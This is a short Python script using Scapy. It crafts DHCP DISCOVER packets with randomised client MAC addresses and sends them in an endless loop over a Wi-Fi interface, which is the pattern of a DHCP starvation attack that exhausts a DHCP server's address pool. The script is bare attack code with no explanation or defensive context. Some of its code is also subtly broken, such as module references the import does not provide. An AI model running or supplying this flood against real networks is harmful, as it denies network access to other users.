from scapy.all import *

# Making an Ethernet packet
DHCP_DISCOVER = scapy.all.Ether(dst='00:11:22:33:44:55', src="55:44:33:22:11:00", type=0x0800) \
            / scapy.all.IP(src='0.0.0.0', dst='255.255.255.255') \
            / scapy.all.UDP(dport=67,sport=68) \
            / scapy.all.BOOTP(op=1, chaddr=RandMAC()) \
            / scapy.all.DHCP(options=[('message-type','discover'), ('end')])


# Sending the crafted packet in layer 2 in a loop using the "Wi-Fi" interface
sendp(DHCP_DISCOVER, iface='Wi-Fi',loop=1,verbose=1 )